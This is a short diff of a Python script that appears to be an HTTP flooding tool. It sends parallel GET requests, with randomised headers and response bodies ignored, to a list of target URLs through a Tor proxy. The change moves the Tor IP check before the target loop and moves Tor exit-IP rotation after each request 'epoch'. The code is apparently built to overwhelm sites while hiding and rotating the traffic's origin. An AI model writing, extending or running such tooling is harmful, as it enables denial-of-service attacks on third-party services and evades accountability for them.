@@ -154,11 +154,8 @@ def change_ip_tor():
         print("switch_tor_ip(): Generated new IP")
         time.sleep(1)
 
-async def check_my_ip_with_tor() -> (int, Dict[str, Any], bytes):
-    session = ClientSession()
-    proxy = "http://127.0.0.1:8118"
-    result = await http_get_with_aiohttp(session, 'https://api.myip.com/', proxy=proxy)
-    await session.close()
+async def check_my_ip_with_tor(session: ClientSession) -> (int, Dict[str, Any], bytes):
+    result = await http_get_with_aiohttp(session, 'https://api.myip.com/', proxy="http://127.0.0.1:8118")
     print("check_my_ip_with_tor(): Your current TOR IP address: " + str(result))
     return result
 #-----------------------------------------------------------------------------------------------------------------------
@@ -200,13 +197,14 @@ async def epoch(epoch_number: int):
     # Open session
     session = ClientSession()
 
+    # Check IP
+    await check_my_ip_with_tor(session)
+
     # Randomize links
     random.shuffle(LIST_OF_HEADERS)
 
     # For each target
     for target_url in LIST_OF_URLS:
-        # Check IP
-        await check_my_ip_with_tor()
 
         # Gen headers and proxy
         headers = random.choice(LIST_OF_HEADERS)
@@ -222,11 +220,11 @@ async def epoch(epoch_number: int):
         results, t = await http_get_with_aiohttp_parallel(session, current_target_urls, headers=headers, proxy=proxy, ignore_json=True, ignore_body=True)
         debug_stats(target_url, results, t)
 
-        # Switch tor IP
-        change_ip_tor()
-
     # Close session
     await session.close()
+
+    # Switch tor IP
+    change_ip_tor()
 
 
 async def main():
